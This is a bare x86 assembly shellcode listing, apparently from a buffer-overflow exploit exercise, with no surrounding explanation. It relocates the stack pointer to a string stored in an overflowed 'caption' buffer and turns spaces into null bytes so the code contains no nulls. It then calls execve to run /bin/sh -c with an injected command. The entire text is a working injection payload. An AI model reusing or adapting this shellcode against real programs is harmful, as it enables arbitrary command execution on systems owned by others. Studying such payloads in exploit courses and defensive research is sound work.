
shellcode:
  xor %eax, %eax	//clear eax
  addl $0x42, %eax	//put 66 into eax
  addl $0x64, %eax	//add 100 to eax to get 166
  shl $2, %eax		//multiply eax by 4 to get 664
  addl $10, %eax	//add 10 to eax to get 674
  subl %eax, %esp	//set esp to start of caption, 674 bytes from return

  movl %esp, %eax	//set eax to "echo..."
  addl $30, %eax	//eax points to ' ' after "echo..."
  movb (%eax), %bl	//get ' '
  subb $0x20, %bl	//change ' ' to '\0'
  movb %bl, (%eax)	//put '\0' in mem

  addl $3, %eax		//eax points to ' ' after "-c"
  movb (%eax), %bl	//get ' '
  subb $0x20, %bl	//change ' ' to '\0'
  movb %bl, (%eax)	//put '\0' in mem

  movl %esp, %ebx	//store esp in ebx
  xorl %eax, %eax	//clear eax
  pushl %eax		//put null on stack
  movl %esp, %edx	//set edx to null
  movl %ebx, %eax	//move "echo..." into eax
  pushl %eax		//put "echo..." on stack
  addl $31, %eax	//move "-c" into eax
  pushl %eax		//put "-c" on stack
  addl $3, %eax		//move "/bin/sh" into eax
  pushl %eax		//put "/bin/sh" on stack
  movl (%esp), %ebx	//set ebx to "/bin/sh"
  movl %esp, %ecx	//set ecx to arguments

  xorl %eax, %eax	//clear eax
  movb $11, %al		//put 11 into eax
  int $0x80		//call execve

